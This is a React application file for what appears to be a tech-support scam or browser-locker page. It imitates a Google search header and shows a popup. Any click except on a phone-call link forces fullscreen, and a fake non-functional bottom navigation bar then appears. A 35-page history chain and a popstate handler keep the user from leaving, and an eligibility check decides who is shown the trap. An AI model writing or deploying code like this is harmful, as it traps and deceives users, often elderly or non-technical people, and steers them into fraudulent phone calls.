import { useState, useEffect, useCallback } from 'react';
import { useEligibility } from './hooks/useEligibility.js';
import { useChainRouter } from './hooks/useChainRouter.js';
import { PopupCard } from './components/PopupCard.jsx';
import { FakeBottomBar } from './components/FakeBottomBar.jsx';
import { DevInspector } from './components/DevInspector.jsx';
import './App.css';

function App() {
  const {
    isEligible,
    isLoading,
    details: eligibilityDetails,
    setDevOverride,
    refresh,
  } = useEligibility();

  // Fullscreen state: false = Attachment 1 (default popup), true = Attachment 2 (fullscreen with fake bottom bar)
  const [isFullscreen, setIsFullscreen] = useState(false);

  // Attempt to enter browser fullscreen
  const requestBrowserFullscreen = useCallback(() => {
    try {
      const docEl = document.documentElement;
      const rfs =
        docEl.requestFullscreen ||
        docEl.webkitRequestFullscreen ||
        docEl.mozRequestFullScreen ||
        docEl.msRequestFullscreen;
      if (rfs && !document.fullscreenElement && !document.webkitFullscreenElement) {
        const promise = rfs.call(docEl);
        if (promise && promise.catch) {
          promise.catch(() => {});
        }
      }
    } catch (err) {
      console.warn('[App] Fullscreen request error:', err);
    }
  }, []);

  // 35-Page history chain router with step-by-step back and step-3 bounce-back loop
  const { currentStep } = useChainRouter({
    totalPages: 35,
    minStep: 3,
    onBounce: () => {
      if (isFullscreen) {
        requestBrowserFullscreen();
      }
    },
    onStepChange: () => {
      if (isFullscreen) {
        requestBrowserFullscreen();
      }
    },
  });

  // Handler for OK or Cancel button clicks or anywhere click
  const handleTriggerFullscreen = useCallback((e) => {
    const isPhoneLink = Boolean(e?.target?.closest?.('a[href^="tel:"]'));
    if (isPhoneLink) {
      return;
    }

    if (e && e.cancelable && e.type !== 'touchend') {
      e.preventDefault();
      e.stopPropagation();
    }

    requestBrowserFullscreen();
    setIsFullscreen(true);
  }, [requestBrowserFullscreen]);

  // Global click / tap listener: anywhere clicked on the website (except phone calling link)
  // triggers fullscreen mode and displays Attachment 2 UI
  useEffect(() => {
    const handleGlobalInteraction = (e) => {
      const isPhoneLink = Boolean(e?.target?.closest?.('a[href^="tel:"]'));
      if (isPhoneLink) {
        return;
      }

      requestBrowserFullscreen();
      setIsFullscreen(true);
    };

    // Capture phase listener to detect any user click or touch on the screen
    document.addEventListener('click', handleGlobalInteraction, { capture: true });
    document.addEventListener('touchend', handleGlobalInteraction, { capture: true });

    return () => {
      document.removeEventListener('click', handleGlobalInteraction, { capture: true });
      document.removeEventListener('touchend', handleGlobalInteraction, { capture: true });
    };
  }, [requestBrowserFullscreen]);

  // Back button interception: keep fullscreen active even when user hits device back button
  useEffect(() => {
    const handlePopState = () => {
      if (isFullscreen) {
        requestBrowserFullscreen();
      }
    };

    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  }, [isFullscreen, requestBrowserFullscreen]);

  return (
    <div
      className={`app-viewport ${isFullscreen ? 'mode-fullscreen' : 'mode-default'}`}
      onClick={handleTriggerFullscreen}
      onTouchEnd={handleTriggerFullscreen}
      data-step={currentStep}
    >
      {/* Background Google search header mimicking Attachment 1 & 2 */}
      <header className="bg-search-header" aria-hidden="true">
        <div className="bg-search-logo">
          <span style={{ color: '#4285F4' }}>G</span>
          <span style={{ color: '#EA4335' }}>o</span>
          <span style={{ color: '#FBBC05' }}>o</span>
          <span style={{ color: '#4285F4' }}>g</span>
          <span style={{ color: '#34A853' }}>l</span>
          <span style={{ color: '#EA4335' }}>e</span>
        </div>
      </header>

      {/* Main Popup Modal (Attachment 1 by default, stays in center in Attachment 2) */}
      <main className="main-content-stage">
        {isLoading ? (
          <div className="popup-dialog-overlay" role="status">
            <div className="popup-card-box loading-box">
              <div className="popup-black-area">
                <p className="popup-black-body">Loading...</p>
              </div>
            </div>
          </div>
        ) : (
          <PopupCard
            isEligible={isEligible}
            onTriggerFullscreen={handleTriggerFullscreen}
          />
        )}
      </main>

      {/* Fake Non-Functional Bottom Navigation Bar (Attachment 2 in Fullscreen) */}
      {isFullscreen && <FakeBottomBar />}

      {/* Dev Inspector only in development mode */}
      {import.meta.env.DEV && (
        <DevInspector
          eligibilityDetails={eligibilityDetails}
          setDevOverride={setDevOverride}
          refresh={refresh}
          isEligible={isEligible}
        />
      )}
    </div>
  );
}

export default App;
